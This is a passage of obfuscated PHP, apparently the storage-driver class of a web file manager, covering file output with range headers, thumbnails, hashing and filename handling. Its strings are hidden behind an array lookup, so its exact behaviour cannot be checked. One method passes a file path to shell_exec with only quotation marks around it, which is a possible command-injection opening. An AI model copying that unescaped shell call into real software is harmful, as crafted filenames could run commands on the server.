!$‘Ηί‘ώΨ[$δκ·ωμ[78]]) { $¶½ξςΒο[$δκ·ωμ[79]] = $‘Ηί‘ώΨ[$δκ·ωμ[79]]; } if (isset($‘Ηί‘ώΨ[$δκ·ωμ[88]])) { $¶½ξςΒο[$δκ·ωμ[88]] = $‘Ηί‘ώΨ[$δκ·ωμ[88]]; } if (is_array($‘Ηί‘ώΨ[$δκ·ωμ[90]])) { $¶½ξςΒο[$δκ·ωμ[89]] = $‘Ηί‘ώΨ[$δκ·ωμ[90]][$δκ·ωμ[87]]; $¶½ξςΒο[$δκ·ωμ[79]] = $‘Ηί‘ώΨ[$δκ·ωμ[90]][$δκ·ωμ[79]]; $¶½ξςΒο[$δκ·ωμ[88]] = $‘Ηί‘ώΨ[$δκ·ωμ[90]][$δκ·ωμ[88]]; } else { if (substr($‘Ηί‘ώΨ[$δκ·ωμ[87]], 0, strlen($΅‘Δέπ)) == $΅‘Δέπ) { $¶½ξςΒο[$δκ·ωμ[87]] = substr($‘Ηί‘ώΨ[$δκ·ωμ[87]], strlen($΅‘Δέπ)); } } $‚¥Δτε¤ = $‘Ηί‘ώΨ[$δκ·ωμ[78]] ? $δκ·ωμ[8] : $δκ·ωμ[12]; $¶½ξςΒο[$δκ·ωμ[89]] = rtrim($¶½ξςΒο[$δκ·ωμ[89]], $δκ·ωμ[8]) . $‚¥Δτε¤; $¶½ξςΒο[$δκ·ωμ[87]] = $δκ·ωμ[8] . trim($¶½ξςΒο[$δκ·ωμ[87]], $δκ·ωμ[8]) . $‚¥Δτε¤; if (!$’ΰά·) { $ΌθύΔζ« = explode($δκ·ωμ[8], trim($¶½ξςΒο[$δκ·ωμ[87]], $δκ·ωμ[8])); $¶½ξςΒο[$δκ·ωμ[87]] = $δκ·ωμ[8] . implode($δκ·ωμ[8], array_slice($ΌθύΔζ«, 1)) . $‚¥Δτε¤; } $¨«ρ†[] = $¶½ξςΒο; } return array_sort_by($¨«ρ†, $δκ·ωμ[87]); } public function upload($‡•ƒ«ς, $¤ΤΪ—Μ, $Κ―„Ζ‹φ = false, $βΎΣΑ΄ = REPEAT_REPLACE) { } public function uploadFileByID($ω΅ψΗ, $£Τ¤‚­, $τΗ…©€) { } public function uploadFileByPath($Κ­«Βφ, $“ρƒ™ρ½, $ΛΘΚύΪΑ = array()) { } public function isUploadServer() { $φΡ•σί =& $_SERVER[γγάψ½]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $φΡ•σί[91]) { return !0; } return $GLOBALS[$φΡ•σί[6]][$φΡ•σί[92]][$φΡ•σί[93]]; } public function isFileOutServer() { $ιΊΚ–Ρ =& $_SERVER[γγάψ½]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ιΊΚ–Ρ[91]) { return !0; } return $GLOBALS[$ιΊΚ–Ρ[6]][$ιΊΚ–Ρ[92]][$ιΊΚ–Ρ[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($ή©€β) { $«ίϋΔλρ =& $_SERVER[γγάψ½]; if (!$this->isCdnHost()) { return $ή©€β; } return str_replace(trim(get_url_root($ή©€β), $«ίϋΔλρ[8]), trim($this->cdnHost, $«ίϋΔλρ[8]), $ή©€β); } public function uploadLink($ΤΚϋ°δέ, $‘ΒΏ“ύΟ = 0) { $λ„‡Ώφ =& $_SERVER[γγάψ½]; if ($this->isUploadServer()) { return; } $ϋΚ™¦ΔΉ = $this->getType(); if (!in_array($ϋΚ™¦ΔΉ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ΞΪά―― = 1024 * 1024 * 10; $“ΣΝι„ΐ = $‘ΒΏ“ύΟ <= $ΞΪά―― ? $λ„‡Ώφ[95] : $λ„‡Ώφ[96]; $ΣΞο½ = (!$‘ΒΏ“ύΟ ? 1 : ceil($‘ΒΏ“ύΟ / pow(1024, 3))) * 3600 * 4; $ΰΝ’ςύ = $this->{$“ΣΝι„ΐ}($ΤΚϋ°δέ, $ΣΞο½); if ($ΰΝ’ςύ) { $ΰΝ’ςύ[$λ„‡Ώφ[97]] = $ΤΚϋ°δέ; $ΰΝ’ςύ[$λ„‡Ώφ[98]] = $ϋΚ™¦ΔΉ; } return $ΰΝ’ςύ; } public function uploadFormData($ώδψ¨Η, $λθϊ…» = 3600) { } public function uploadMultiData($Κ±Ι›, $³εΒό‘α = 3600) { } public function multiUploadFormData($υΉ¬ζΨι, $£Άκ”λ = 3600) { return $this->uploadMultiData($υΉ¬ζΨι, $£Άκ”λ); } public function download($ύΒ³Ά, $κφ«Χ΄¥) { } public function ext($ίΉ™©‹) { $ΌϊΒ =& $_SERVER[γγάψ½]; if (strpos($ίΉ™©‹, $ΌϊΒ[8]) === -1) { $χΩλω = $ίΉ™©‹; } else { $χΩλω = $this->pathThis($ίΉ™©‹); } $Ω¶¨ΐ…Μ = $ΌϊΒ[12]; if (strstr($χΩλω, $ΌϊΒ[10])) { $Ω¶¨ΐ…Μ = substr($χΩλω, strrpos($χΩλω, $ΌϊΒ[10]) + 1); $Ω¶¨ΐ…Μ = strtolower($Ω¶¨ΐ…Μ); } if (strlen($Ω¶¨ΐ…Μ) > 3 && preg_match($ΌϊΒ[99], $Ω¶¨ΐ…Μ, $¶ΎΕυΑϊ)) { $Ω¶¨ΐ…Μ = $ΌϊΒ[12]; } return $Ω¶¨ΐ…Μ; } public function pathThis($Γ¦‰¤¶) { $Η”ΐΒ =& $_SERVER[γγάψ½]; $Γ¦‰¤¶ = str_replace($Η”ΐΒ[100], $Η”ΐΒ[8], rtrim($Γ¦‰¤¶, $Η”ΐΒ[8])); $ί¤¬“ = strrpos($Γ¦‰¤¶, $Η”ΐΒ[8]); if ($ί¤¬“ === !1) { return $Γ¦‰¤¶; } return substr($Γ¦‰¤¶, $ί¤¬“ + 1); } public function pathFather($‚Β°ΣΪ) { $ϋ”Ϋ΄ηΥ =& $_SERVER[γγάψ½]; $‚Β°ΣΪ = str_replace($ϋ”Ϋ΄ηΥ[100], $ϋ”Ϋ΄ηΥ[8], rtrim($‚Β°ΣΪ, $ϋ”Ϋ΄ηΥ[8])); $ζβ΅ά’ = strrpos($‚Β°ΣΪ, $ϋ”Ϋ΄ηΥ[8]); if ($ζβ΅ά’ === !1) { return $ϋ”Ϋ΄ηΥ[12]; } return substr($‚Β°ΣΪ, 0, $ζβ΅ά’ + 1); } public function hashSimple($άα§«¦¥) { $αβωοΙΕ =& $_SERVER[γγάψ½]; if (!$άα§«¦¥) { return md5($αβωοΙΕ[12]); } $ϊΥ“δ = $this->size($άα§«¦¥); $Ϋρ’”© = 200; $Λ¨µΉ = 50; if ($ϊΥ“δ <= $Ϋρ’”© * $Λ¨µΉ) { return $this->hashMd5($άα§«¦¥) . $ϊΥ“δ; } $…™°σ = intval($ϊΥ“δ / $Λ¨µΉ); $δ³ ΡΥη = $αβωοΙΕ[12]; for ($ύ›ο» = 0; $ύ›ο» < $Λ¨µΉ; $ύ›ο»++) { $δ³ ΡΥη .= $this->fileSubstr($άα§«¦¥, $…™°σ * $ύ›ο», $Ϋρ’”©); } $δ³ ΡΥη .= $this->fileSubstr($άα§«¦¥, $ϊΥ“δ - $Ϋρ’”©, $Ϋρ’”©); return md5($δ³ ΡΥη) . $ϊΥ“δ; } public static $md5Cache = array(); public function hashMd5($±ρ»•¦τ) { if (!$±ρ»•¦τ) { return md5($_SERVER[γγάψ½][12]); } $±ρ»•¦τ = $this->iconvSystem($±ρ»•¦τ); if (isset(self::$md5Cache[$±ρ»•¦τ])) { return self::$md5Cache[$±ρ»•¦τ]; } self::$md5Cache[$±ρ»•¦τ] = $this->hashMd5Shell($±ρ»•¦τ); if (!self::$md5Cache[$±ρ»•¦τ]) { self::$md5Cache[$±ρ»•¦τ] = @md5_file($±ρ»•¦τ); } return self::$md5Cache[$±ρ»•¦τ]; } private function hashMd5Shell($ƒ‹›Ρέζ) { $ΝζΦα =& $_SERVER[γγάψ½]; if (!$ƒ‹›Ρέζ) { return md5($ΝζΦα[12]); } if (!function_exists($ΝζΦα[101])) { return !1; } $Ν¦ΜΈ® = array($ΝζΦα[102], $ΝζΦα[103]); $Γµ«ώ = Cache::get($ΝζΦα[104]); if (!$Γµ«ώ) { $¶‹Νύοί = BASIC_PATH . $ΝζΦα[105]; $μβΉ•£ρ = md5_file($¶‹Νύοί); $Γµ«ώ = $ΝζΦα[106]; foreach ($Ν¦ΜΈ® as $Ϊƒ±ηϊ) { $»‡ζ·Ή = shell_exec($Ϊƒ±ηϊ . "\40\42{$¶‹Νύοί}\42"); if ($»‡ζ·Ή && substr(trim($»‡ζ·Ή), 0, 32) == $μβΉ•£ρ) { $Γµ«ώ = $Ϊƒ±ηϊ; break; } } Cache::set($ΝζΦα[104], $Γµ«ώ, 3600); } if ($Γµ«ώ == $ΝζΦα[106]) { return !1; } $»‡ζ·Ή = shell_exec($Γµ«ώ . "\x20\42{$ƒ‹›Ρέζ}\x22"); $»‡ζ·Ή = str_replace($ΝζΦα[107], $ΝζΦα[12], $»‡ζ·Ή); return substr($»‡ζ·Ή, 0, 32); } public function link($²¬‚ΚΑ) { return $²¬‚ΚΑ; } public function fileOut($ΆϋµυΣϊ, $Ώ‰ΧΡ¶Δ = false, $Δ²Κ­­™ = false, $·ο‰—σ = '') { $‡ν–θΙΕ =& $_SERVER[γγάψ½]; $this->cacheMethod(null, null); if (!$ΆϋµυΣϊ || !$this->exist($ΆϋµυΣϊ)) { show_json(LNG($‡ν–θΙΕ[108]), !1, $Δ²Κ­­™); } $εΆϊσ΄€ = $this->getType() == $‡ν–θΙΕ[109]; $¥τφ = $GLOBALS[$‡ν–θΙΕ[6]][$‡ν–θΙΕ[92]][$‡ν–θΙΕ[110]][$‡ν–θΙΕ[111]]; $εϊέΛƒχ = (double) $GLOBALS[$‡ν–θΙΕ[6]][$‡ν–θΙΕ[92]][$‡ν–θΙΕ[110]][$‡ν–θΙΕ[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $΅φ‹Λ–΅ = $this->infoFull($ΆϋµυΣϊ); $®¶ςί–η = $΅φ‹Λ–΅[$‡ν–θΙΕ[79]]; $Βά­ΉΠ = gmdate($‡ν–θΙΕ[113], $΅φ‹Λ–΅[$‡ν–θΙΕ[88]]); $Π‘ωΞΤ = $Δ²Κ­­™ ? $Δ²Κ­­™ : $this->iconvApp($΅φ‹Λ–΅[$‡ν–θΙΕ[32]]); $ΥΔ€Σά = 0; $ΔΔί = $®¶ςί–η - 1; $’ΰΕ› = $this->ext($Π‘ωΞΤ); if (in_array($’ΰΕ›, array($‡ν–θΙΕ[114], $‡ν–θΙΕ[115], $‡ν–θΙΕ[116], $‡ν–θΙΕ[117]))) { $’ΰΕ› = $‡ν–θΙΕ[118]; } if (in_array($’ΰΕ›, array($‡ν–θΙΕ[119]))) { $’ΰΕ› = $‡ν–θΙΕ[120]; } if (!$·ο‰—σ) { $·ο‰—σ = md5($Βά­ΉΠ . $®¶ςί–η); } $·ο‰—σ = $‡ν–θΙΕ[121] . $·ο‰—σ . $‡ν–θΙΕ[121]; $Ύ¦®κ = get_file_mime($’ΰΕ›); $€“Ί™Ο” = !0; $€“Ί™Ο” = isset($_GET[$‡ν–θΙΕ[122]]) ? !1 : !0; if ($Ώ‰ΧΡ¶Δ === !1 && !mime_support($Ύ¦®κ)) { $Ύ¦®κ = $‡ν–θΙΕ[123]; } header($‡ν–θΙΕ[124]); header($‡ν–θΙΕ[125] . $Ύ¦®κ); $£ΉΪ¥ξ© = rawurlencode($Π‘ωΞΤ); $£ΉΪ¥ξ© = $‡ν–θΙΕ[121] . $£ΉΪ¥ξ© . $‡ν–θΙΕ[126] . $£ΉΪ¥ξ©; if ($Ώ‰ΧΡ¶Δ) { header($‡ν–θΙΕ[127]); header($‡ν–θΙΕ[128] . $£ΉΪ¥ξ©); } else { if ($€“Ί™Ο”) { header($‡ν–θΙΕ[129] . $£ΉΪ¥ξ©); } } $Ό¬¦Ξ­ά = 3600 * 24 * 30; header($‡ν–θΙΕ[130]); header($‡ν–θΙΕ[131]); header($‡ν–θΙΕ[132] . $Ό¬¦Ξ­ά); header($‡ν–θΙΕ[133] . gmdate($‡ν–θΙΕ[113], time() + $Ό¬¦Ξ­ά) . $‡ν–θΙΕ[134]); if (isset($_SERVER[$‡ν–θΙΕ[135]]) && strtotime($_SERVER[$‡ν–θΙΕ[135]]) == $΅φ‹Λ–΅[$‡ν–θΙΕ[88]]) { header($‡ν–θΙΕ[136], !0, 304); die; } if (isset($_SERVER[$‡ν–θΙΕ[137]]) && $_SERVER[$‡ν–θΙΕ[137]] == $·ο‰—σ) { header($‡ν–θΙΕ[138] . $·ο‰—σ, !0, 304); die; } header($‡ν–θΙΕ[138] . $·ο‰—σ); header($‡ν–θΙΕ[139] . $Βά­ΉΠ . $‡ν–θΙΕ[134]); header($‡ν–θΙΕ[140] . $Π‘ωΞΤ); header($‡ν–θΙΕ[141]); header($‡ν–θΙΕ[142] . $®¶ςί–η); header($‡ν–θΙΕ[143]); Hook::trigger($‡ν–θΙΕ[144], $ΆϋµυΣϊ, $®¶ςί–η, $Π‘ωΞΤ, $’ΰΕ›); if (!$Ώ‰ΧΡ¶Δ && $’ΰΕ› == $‡ν–θΙΕ[145]) { if ($®¶ςί–η > 1024 * 1024 * 5) { die; } $‚ραΓΆ¦ = $this->getContent($ΆϋµυΣϊ); $‚ραΓΆ¦ = Html::clearSVG($‚ραΓΆ¦); header($‡ν–θΙΕ[146] . strlen($‚ραΓΆ¦)); echo $‚ραΓΆ¦; die; } $ύκΥ¨ΐ = strtolower($_SERVER[$‡ν–θΙΕ[147]]); if ($εΆϊσ΄€ && $ύκΥ¨ΐ && $¥τφ) { if (strstr($ύκΥ¨ΐ, $‡ν–θΙΕ[148])) { header($‡ν–θΙΕ[149] . $ΆϋµυΣϊ); } else { if (strstr($ύκΥ¨ΐ, $‡ν–θΙΕ[150])) { header($‡ν–θΙΕ[151] . $ΆϋµυΣϊ); } else { if (strstr($ύκΥ¨ΐ, $‡ν–θΙΕ[152])) { header($‡ν–θΙΕ[153] . $ΆϋµυΣϊ); } } } if ($εϊέΛƒχ) { header($‡ν–θΙΕ[154] . $εϊέΛƒχ); } return; } if (isset($_SERVER[$‡ν–θΙΕ[155]])) { if (preg_match($‡ν–θΙΕ[156], $_SERVER[$‡ν–θΙΕ[155]], $ϋΔ‚ρΝΚ)) { $ΥΔ€Σά = intval($ϋΔ‚ρΝΚ[1]); $ΥΔ€Σά = $ΥΔ€Σά <= 0 ? 0 : ($ΥΔ€Σά >= $ΔΔί ? $ΔΔί : $ΥΔ€Σά); if (!empty($ϋΔ‚ρΝΚ[2])) { $†‰πιΩ = intval($ϋΔ‚ρΝΚ[2]); $ΔΔί = $†‰πιΩ < $ΥΔ€Σά ? $ΥΔ€Σά : ($†‰πιΩ >= $ΔΔί ? $ΔΔί : $†‰πιΩ); } } header($‡ν–θΙΕ[157]); header("\x43\157\156\x74\145\x6e\164\55\x52\x61\156\147\x65\72\x20\142\x79\x74\x65\163\x20{$ΥΔ€Σά}\55{$ΔΔί}\57" . $®¶ςί–η); } else { header($‡ν–θΙΕ[158]); } header($‡ν–θΙΕ[159]); header($‡ν–θΙΕ[160]); $³Άυ»ΠΡ = !0; if ($_SERVER[$‡ν–θΙΕ[161]] == $‡ν–θΙΕ[162] && $®¶ςί–η > 1204 * 1024 * 1024 * 2) { $³Άυ»ΠΡ = !1; } if ($³Άυ»ΠΡ) { header($‡ν–θΙΕ[163] . ($ΔΔί - $ΥΔ€Σά + 1)); } if ($_SERVER[$‡ν–θΙΕ[164]] == $‡ν–θΙΕ[165]) { return; } $•®πΠκ = array($‡ν–θΙΕ[166] => !1, $‡ν–θΙΕ[167] => $ΥΔ€Σά, $‡ν–θΙΕ[168] => $ΔΔί, $‡ν–θΙΕ[169] => $’ΰΕ›, $‡ν–θΙΕ[170] => $΅φ‹Λ–΅, $‡ν–θΙΕ[171] => $‡ν–θΙΕ[12], $‡ν–θΙΕ[172] => 0); $•®πΠκ = Hook::filter($‡ν–θΙΕ[173], $•®πΠκ); $΄ηƒΟ = 1024 * 300; $³δξΩμ = 0; if ($εϊέΛƒχ) { $³δξΩμ = intval(1000 * 1000 * ($΄ηƒΟ / $εϊέΛƒχ)); } while ($ΥΔ€Σά <= $ΔΔί) { $π…Ψ… = timeFloat(); check_abort(); $γυ¥μρ = $ΔΔί - $ΥΔ€Σά + 1; if ($γυ¥μρ <= $΄ηƒΟ) { $΄ηƒΟ = $γυ¥μρ; } $‚ραΓΆ¦ = $this->fileSubstr($ΆϋµυΣϊ, $ΥΔ€Σά, $΄ηƒΟ); if ($•®πΠκ[$‡ν–θΙΕ[166]]) { $•®πΠκ[$‡ν–θΙΕ[171]] = $‚ραΓΆ¦; $•®πΠκ[$‡ν–θΙΕ[172]] = $ΥΔ€Σά; $•®πΠκ = Hook::filter($‡ν–θΙΕ[174], $•®πΠκ); $‚ραΓΆ¦ = $•®πΠκ[$‡ν–θΙΕ[171]]; } echo $‚ραΓΆ¦; $ΥΔ€Σά += $΄ηƒΟ; if ($΄ηƒΟ == $γυ¥μρ) { $ΥΔ€Σά = $ΔΔί + 1; } if ($³δξΩμ) { $ψ†χ†ΆΌ = intval(1000 * 1000 * (timeFloat() - $π…Ψ…)); $»ι ω– = $³δξΩμ - $ψ†χ†ΆΌ; if ($»ι ω– > 5) { usleep($»ι ω–); } } } } public function fileOutServer($ςΞΜ³, $―¦ƒΔ = false, $Ϊ„Σΰ = false, $κΐ¥ƒϋΗ = '') { $this->fileOut($ςΞΜ³, $―¦ƒΔ, $Ϊ„Σΰ, $κΐ¥ƒϋΗ); } public function fileOutLink($‡Χύƒ) { header($_SERVER[γγάψ½][175] . $‡Χύƒ); die; } public function cacheMethod($Αϊτ›σΑ, $ΊοΏΕά‚, $±—‹Δες = null) { $Αψΐια =& $_SERVER[γγάψ½]; static $Π± ­ = array(); $†ΓΘω΄Κ = $ΊοΏΕά‚ ? ltrim($this->getPathOuter($ΊοΏΕά‚), $Αψΐια[8]) : $Αψΐια[12]; $Βμεƒύ = $Αψΐια[176] . $Αϊτ›σΑ . $Αψΐια[177] . rtrim($†ΓΘω΄Κ, $Αψΐια[8]); if (is_null($Αϊτ›σΑ)) { $Π± ­ = array(); return; } if (is_null($ΊοΏΕά‚)) { foreach ($Π± ­ as $Βμεƒύ => $©‚ΘίΦ) { if (!strstr($Βμεƒύ, $Αψΐια[176] . $Αϊτ›σΑ . $Αψΐια[178])) { continue; } unset($Π± ­[$Βμεƒύ]); } return; } if ($±—‹Δες === $Αψΐια[179]) { unset($Π± ­[$Βμεƒύ]); return; } if (!is_null($±—‹Δες)) { $Π± ­[$Βμεƒύ] = $±—‹Δες; return; } $Ωƒ²χ = isset($Π± ­[$Βμεƒύ]) ? $Π± ­[$Βμεƒύ] : null; if (!is_null($Ωƒ²χ)) { return $Ωƒ²χ; } $Ωƒ²χ = $this->{$Αϊτ›σΑ}($ΊοΏΕά‚); $Π± ­[$Βμεƒύ] = $Ωƒ²χ; return $Ωƒ²χ; } public function cacheMethodInfoSet($Α¨έ΄β, $–—ξ³ε, $ΜίθΆρ = false) { $μ—θω ΄ =& $_SERVER[γγάψ½]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($μ—θω ΄[180], $Α¨έ΄β, $–—ξ³ε); $this->cacheMethod($μ—θω ΄[181], $Α¨έ΄β, $–—ξ³ε ? !1 : !0); if (is_array($ΜίθΆρ)) { $this->cacheMethod($μ—θω ΄[182], $Α¨έ΄β, $ΜίθΆρ); } } public function fileOutImage($ζ―·³ϊ, $΅Ξχ³£ = 250) { $Ώ›’δΘ =& $_SERVER[γγάψ½]; set_timeout(); if (substr($ζ―·³ϊ, 0, 4) == $Ώ›’δΘ[152]) { $this->fileOutLink($ζ―·³ϊ); } $¦°ξ« = $this->info($ζ―·³ϊ); $ξπβώ΅… = !1; $ΦνΟΉό = isset($GLOBALS[$Ώ›’δΘ[183]]) ? $GLOBALS[$Ώ›’δΘ[183]] : array(); if ($ΦνΟΉό && $ΦνΟΉό[$Ώ›’δΘ[184]] == $¦°ξ«[$Ώ›’δΘ[87]]) { $¦°ξ« = $ΦνΟΉό; $άΰ¤ψ— = $¦°ξ«[$Ώ›’δΘ[185]]; if ($άΰ¤ψ— && isset($άΰ¤ψ—[$Ώ›’δΘ[186]])) { if ($άΰ¤ψ—[$Ώ›’δΘ[186]] <= $΅Ξχ³£ && $άΰ¤ψ—[$Ώ›’δΘ[187]] <= $΅Ξχ³£) { $ξπβώ΅… = !0; } } } if ($¦°ξ«[$Ώ›’δΘ[79]] <= 1024 * 50 || $ξπβώ΅… || !function_exists($Ώ›’δΘ[188]) || $¦°ξ«[$Ώ›’δΘ[169]] == $Ώ›’δΘ[189]) { return $this->fileOut($ζ―·³ϊ, !1, $¦°ξ«[$Ώ›’δΘ[32]]); } $έ‚ρ† = kodIO::hashPath($¦°ξ«); $Ίψ·κ = "\x63\x6f\x76\x65\x72\137{$έ‚ρ†}\137{$΅Ξχ³£}\x2e\x70\x6e\147"; $΅Τ†­χ = IO_PATH_SYSTEM_TEMP . $Ώ›’δΘ[190]; $ΎΞ•ΏΡ› = IO::infoFullSimple($΅Τ†­χ); $µ•θςΩ› = $ΎΞ•ΏΡ› && is_array($ΎΞ•ΏΡ›) ? $ΎΞ•ΏΡ›[$Ώ›’δΘ[87]] : $Ώ›’δΘ[12]; if (!$µ•θςΩ›) { $µ•θςΩ› = IO::mkdir($΅Τ†­χ); } if ($¦°ξ«[$Ώ›’δΘ[191]] == $Ώ›’δΘ[192] && isset($¦°ξ«[$Ώ›’δΘ[193]]) && $¦°ξ«[$Ώ›’δΘ[193]] == kodIO::sourceID($µ•θςΩ›)) { $δ–ΑΛά = $¦°ξ«[$Ώ›’δΘ[194]]; if ($΅Ξχ³£ <= 500) { $ίΕκπ = preg_replace($Ώ›’δΘ[195], $Ώ›’δΘ[196], $¦°ξ«[$Ώ›’δΘ[32]]); $δ–ΑΛά = IO::fileNameExist($µ•θςΩ›, $ίΕκπ); } return IO::fileOut(KodIO::make($δ–ΑΛά), !1, $¦°ξ«[$Ώ›’δΘ[32]]); } $ΨζΏ€Βμ = IO::fileNameExist($µ•θςΩ›, $Ίψ·κ); if ($ΨζΏ€Βμ) { return IO::fileOut(KodIO::make($ΨζΏ€Βμ), !1, $¦°ξ«[$Ώ›’δΘ[32]]); } if ($΅Ξχ³£ > 1000) { $this->makeImageCover($µ•θςΩ›, $ζ―·³ϊ, $Ίψ·κ, $΅Ξχ³£); $this->makeImageCover($µ•θςΩ›, $ζ―·³ϊ, "\x63\157\166\x65\162\x5f{$έ‚ρ†}\137\62\65\x30\x2e\x70\x6e\x67", 250); $ΨζΏ€Βμ = IO::fileNameExist($µ•θςΩ›, $Ίψ·κ); if ($ΨζΏ€Βμ) { return IO::fileOut(KodIO::make($ΨζΏ€Βμ), !1, $¦°ξ«[$Ώ›’δΘ[32]]); } die; } if (!kodIO::allowCover($¦°ξ«)) { return $this->fileOut($ζ―·³ϊ, !1, $¦°ξ«[$Ώ›’δΘ[32]]); } $γΑϊΘ… = Cache::get($Ίψ·κ); if ($γΑϊΘ… == $Ώ›’δΘ[197] || $γΑϊΘ… == $Ώ›’δΘ[198]) { echo $γΑϊΘ…; die; } Cache::set($Ίψ·κ, $Ώ›’δΘ[198], 60); $ζζ΄ξ— = array($µ•θςΩ›, $¦°ξ«[$Ώ›’δΘ[87]], $Ίψ·κ, $΅Ξχ³£); $‘΅γφ†έ = $Ώ›’δΘ[199] . $¦°ξ«[$Ώ›’δΘ[79]] . $Ώ›’δΘ[200] . $Ίψ·κ . $Ώ›’δΘ[201] . $¦°ξ«[$Ώ›’δΘ[32]] . $Ώ›’δΘ[202] . $¦°ξ«[$Ώ›’δΘ[87]]; TaskQueue::add($Ώ›’δΘ[203], $ζζ΄ξ—, $‘΅γφ†έ, $Ίψ·κ); } public function makeImageCover($πΑΣ‘ΠΈ, $όώΨΗ¤ς, $›άΨΨΈ‡, $ΔΗΟ§) { $ΐΨ«£΅β =& $_SERVER[γγάψ½]; if (IO::fileNameExist($πΑΣ‘ΠΈ, $›άΨΨΈ‡)) { return $ΐΨ«£΅β[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $‹® ίΞύ = $this->getPathOuter($όώΨΗ¤ς); $Ώ―£”Ώ– = DATA_THUMB . $›άΨΨΈ‡; del_file($Ώ―£”Ώ–); $΄ϊΌΣ¤¤ = IO::copy($‹® ίΞύ, TEMP_FILES, !1, $›άΨΨΈ‡); if (!@file_exists($΄ϊΌΣ¤¤)) { return $ΐΨ«£΅β[205]; } ImageThumb::createThumb($΄ϊΌΣ¤¤, $Ώ―£”Ώ–, $ΔΗΟ§, $ΔΗΟ§ * 10); if (@file_exists($Ώ―£”Ώ–)) { Cache::remove($›άΨΨΈ‡); return IO::move($Ώ―£”Ώ–, $πΑΣ‘ΠΈ); } Cache::set($›άΨΨΈ‡, $ΐΨ«£΅β[197], 600); del_file($Ώ―£”Ώ–); return $ΐΨ«£΅β[206] . $΄ϊΌΣ¤¤ . $ΐΨ«£΅β[74]; } public function fileOutImageServer($€σν», $ζ©‡σ = 250) { $this->fileOutImage($€σν», $ζ©‡σ); } public function fileNameAuto($π±‘Ή§ϋ, $ΡηΒμΈ, $ΤΉδΐ«γ = REPEAT_RENAME, $ΰ“Ά‘› = false) { $“΅ζά =& $_SERVER[γγάψ½]; $ζώερζ• = $π±‘Ή§ϋ === $“΅ζά[12] ? $ΡηΒμΈ : rtrim($π±‘Ή§ϋ, $“΅ζά[8]) . $“΅ζά[8] . $ΡηΒμΈ; if ($ΤΉδΐ«γ == REPEAT_REPLACE || !$this->exist($ζώερζ•) || $ΰ“Ά‘› && $ΤΉδΐ«γ != REPEAT_RENAME_FOLDER) { return $ΡηΒμΈ; } if ($ΤΉδΐ«γ == REPEAT_SKIP) { return !1; } $νΑΕΩ = $“΅ζά[10] . get_path_ext($ΡηΒμΈ); $νΑΕΩ = $νΑΕΩ == $“΅ζά[10] || $ΰ“Ά‘› ? $“΅ζά[12] : $νΑΕΩ; $Ώΰ΄οιθ = 1; $¬„• Ώ = substr($ΡηΒμΈ, 0, strlen($ΡηΒμΈ) - strlen($νΑΕΩ)); $μηΎΔ½ = $¬„• Ώ . "\x28{$Ώΰ΄οιθ}\x29{$νΑΕΩ}"; while ($this->exist(rtrim($π±‘Ή§ϋ, $“΅ζά[8]) . $“΅ζά[8] . $μηΎΔ½)) { $μηΎΔ½ = $¬„• Ώ . "\50{$Ώΰ΄οιθ}\51{$νΑΕΩ}"; $Ώΰ΄οιθ++; } return $μηΎΔ½; } private function fileNameAutoList($ωΔ²ΗΫΟ, $Λ©Ό, $Όνν»ΐ“ = false) { $Υλ―λ«Ρ =& $_SERVER[γγάψ½]; $Κΐ‚ΙΈΒ = $this->listPath($ωΔ²ΗΫΟ, !0); $Κΐ‚ΙΈΒ = array_merge($Κΐ‚ΙΈΒ[$Υλ―λ«Ρ[85]], $Κΐ‚ΙΈΒ[$Υλ―λ«Ρ[86]]); $²›ζ³— = array_to_keyvalue($Κΐ‚ΙΈΒ, $Υλ―λ«Ρ[12], $Υλ―λ«Ρ[32]); $ΚΎ–µ¶Ι = $Υλ―λ«Ρ[10] . get_path_ext($Λ©Ό); $ΚΎ–µ¶Ι = $ΚΎ–µ¶Ι == $Υλ―λ«Ρ[10] || $Όνν»ΐ“ ? $Υλ―λ«Ρ[12] : $ΚΎ–µ¶Ι; $°™ι’° = substr($Λ©Ό, 0, strlen($Λ©Ό) - strlen($ΚΎ–µ¶Ι)); $¤‰ώϋµ§ = $°™ι’° . "\50\x30\x29{$ΚΎ–µ¶Ι}"; for ($•οα¨ς = 1; $•οα¨ς <= count($²›ζ³—) + 1; $•οα¨ς++) { $¤‰ώϋµ§ = $°™ι’° . "\50{$•οα¨ς}\x29{$ΚΎ–µ¶Ι}"; if (!in_array_not_case($¤‰ώϋµ§, $²›ζ³—)) { return $¤‰ώϋµ§; } } return $¤‰ώϋµ§; } public function listAllFiles($ϋσ™–«ΐ, $±υ΄ε) { $²’― ‹ =& $_SERVER[γγάψ½]; if (empty($±υ΄ε)) { return array(); } $μΰάδώΚ = array_keys($±υ΄ε); $·‹Ω‡¦ = array(); $ϋσ™–«ΐ = trim($ϋσ™–«ΐ, $²’― ‹[8]); foreach ($±υ΄ε as $ζ§½Ργ => $Χύ®ή») { $Ωθκƒδ = ltrim(substr(trim($ζ§½Ργ, $²’― ‹[8]), strlen($ϋσ™–«ΐ)), $²’― ‹[8]); if (substr($ζ§½Ργ, -1) == $²’― ‹[8]) { $Ωθκƒδ = rtrim($Ωθκƒδ, $²’― ‹[8]) . $²’― ‹[8]; } $·‹Ω‡¦ = array_merge($·‹Ω‡¦, $this->slicePath($Ωθκƒδ)); } $Ωπκ  = array(); foreach (array_unique($·‹Ω‡¦) as $„’δΐΈ) { $΅±φ²γΏ = array($²’― ‹[87] => $this->getPathOuter($²’― ‹[8] . $ϋσ™–«ΐ . $²’― ‹[8] . $„’δΐΈ), $²’― ‹[78] => 1, $²’― ‹[79] => 0); if (substr($„’δΐΈ, -1) != $²’― ‹[8]) { $΅±φ²γΏ[$²’― ‹[78]] = 0; $πΕΙ«ώ· = $this->getPath($ϋσ™–«ΐ . $²’― ‹[8] . $„’δΐΈ); if (isset($±υ΄ε[$πΕΙ«ώ·])) { $ΤΈφά = $±υ΄ε[$πΕΙ«ώ·]; if (isset($ΤΈφά[$²’― ‹[79]])) { $΅±φ²γΏ[$²’― ‹[79]] = 